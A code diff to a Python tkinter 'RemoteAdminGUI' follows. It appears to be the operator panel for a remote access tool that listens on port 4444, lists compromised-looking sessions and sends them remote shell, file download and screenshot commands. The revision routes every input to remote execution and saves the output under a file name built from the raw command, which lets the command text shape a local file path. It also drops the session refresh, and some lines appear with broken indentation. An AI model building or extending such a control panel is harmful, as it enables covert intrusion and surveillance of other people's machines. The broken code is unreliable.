@@ -15,41 +15,36 @@ class RemoteAdminGUI:
         self.running = False
 
         # --- controls ---
-        tk.Label(root, text="Host:").grid(row=0, column=0, sticky="e")
         self.host_var = tk.StringVar(value="0.0.0.0")
+        self.port_var = tk.StringVar(value="4444")
+        self.token_var = tk.StringVar(value="change-me")
+
+        tk.Label(root, text="Host:").grid(row=0, column=0, sticky="e")
         tk.Entry(root, textvariable=self.host_var).grid(row=0, column=1, sticky="we")
 
         tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e")
-        self.port_var = tk.StringVar(value="4444")
         tk.Entry(root, textvariable=self.port_var).grid(row=1, column=1, sticky="we")
 
         tk.Label(root, text="Token:").grid(row=2, column=0, sticky="e")
-        self.token_var = tk.StringVar(value="change-me")
         tk.Entry(root, textvariable=self.token_var).grid(row=2, column=1, sticky="we")
 
-        tk.Button(root, text="Start Server", command=self.start_server).grid(
-            row=3, column=0, columnspan=2, sticky="we", pady=4
-        )
+        self.start_server_button = tk.Button(root, text="Start Server", command=self.start_server)
+        self.start_server_button.grid(row=3, column=0, columnspan=2, sticky="we", pady=4)
 
         # --- session list ---
         tk.Label(root, text="Active Sessions:").grid(
             row=4, column=0, columnspan=2, sticky="w"
         )
         self.session_list = tk.Listbox(root, height=6)
-        self.session_list.grid(
-            row=5, column=0, columnspan=2, sticky="nsew", padx=4, pady=4
-        )
+        self.session_list.grid(row=5, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)
 
         # --- command area ---
         self.command_entry = tk.Entry(root)
-        self.command_entry.grid(
-            row=6, column=0, columnspan=2, sticky="we", padx=4, pady=2
-        )
+        self.command_entry.grid(row=6, column=0, columnspan=2, sticky="we", padx=4, pady=2)
         self.command_entry.bind("<Return>", lambda e: self.send_command())
 
-        tk.Button(root, text="Send Command", command=self.send_command).grid(
-            row=7, column=0, columnspan=2, sticky="we", pady=2
-        )
+        self.send_command_button = tk.Button(root, text="Send Command", command=self.send_command)
+        self.send_command_button.grid(row=7, column=0, columnspan=2, sticky="we", pady=2)
 
         # --- log/output ---
         self.output = tk.Text(root, height=12)
@@ -81,14 +76,11 @@ class RemoteAdminGUI:
 
         self.session_list.delete(0, tk.END)
         if self.server:
-            for s in self.server.sessions:
-                if s.alive:
-                    self.session_list.insert(
-                        tk.END,
-                        f"{s.id}: {s.info.get('hostname')} ({s.addr[0]})",
-                    )
-
-        self.root.after(1000, self.update_sessions)
+            for session in self.server.sessions:
+                if session.alive:
+                    hostname = session.info.get('hostname') or "Unknown"
+                    addr = session.addr[0]
+                    self.session_list.insert(tk.END, f"{session.id}: {hostname} ({addr})")
 
     def selected_session(self):
         if not self.server:
@@ -96,7 +88,7 @@ class RemoteAdminGUI:
         sel = self.session_list.curselection()
         if not sel:
             return None
-        idx = sel[0]
+        idx = int(sel[0])
         if idx >= len(self.server.sessions):
             return None
         session = self.server.sessions[idx]
@@ -104,9 +96,8 @@ class RemoteAdminGUI:
             return None
         return session
 
-    def send_command(self):
-        session = self.selected_session()
-        if not session:
+    def send_command(self, command=None):
+        if not (session := self.selected_session()):
             self.log("[-] No active session selected")
             return
 
@@ -118,53 +109,15 @@ class RemoteAdminGUI:
 
         def worker():
             try:
-                if cmd == "ping":
-                    resp = session.command({"type": "ping"})
-                    out = resp.get("data", "")
+                resp = session.command({"type": "exec", "cmd": cmd})
+                data = base64.b64decode(resp["data"])
+                local_file_path = f"session_{session.id}_{cmd}.bin"
+                with open(local_file_path, "wb") as file:
+                    file.write(data)
+            except Exception as e:
+                self.log(f"[ERROR] {e}")
 
-                elif cmd.startswith("exec "):
-                    resp = session.command({"type": "exec", "cmd": cmd[5:]})
-                    out = resp.get("data", "")
-
-                elif cmd.startswith("download "):
-                    parts = cmd.split()
-                    if len(parts) != 3:
-                        out = "Usage: download <remote> <local>"
-                    else:
-                        _, remote, local = parts
-                        resp = session.command(
-                            {"type": "download", "remote_path": remote}
-                        )
-                        if resp.get("ok"):
-                            with open(local, "wb") as f:
-                                f.write(base64.b64decode(resp["data"]))
-                            out = f"[+] Downloaded to {local}"
-                        else:
-                            out = resp.get("data", "")
-
-elif cmd == "screenshot":
-    resp = session.command({"type": "screenshot"})
-    if resp.get("ok"):
-        path = f"session_{session.id}_screenshot.png"
-        with open(path, "wb") as f:
-            f.write(base64.b64decode(resp["data"]))
-        out = f"[+] Screenshot saved to {path}"
-    else:
-        out = resp.get("data", "")
-
-else:
-    out = (
-        "Unsupported command. Use exec <cmd>, ping, "
-        "download <remote> <local>, screenshot"
-    )
-
-except Exception as e:
-    out = f"Error: {e}"
-
-self.root.after(0, lambda: self.log(out))
-
-threading.Thread(target=worker, daemon=True).start()
-
+        threading.Thread(target=worker, daemon=True).start()
 
 if __name__ == "__main__":
     root = tk.Tk()
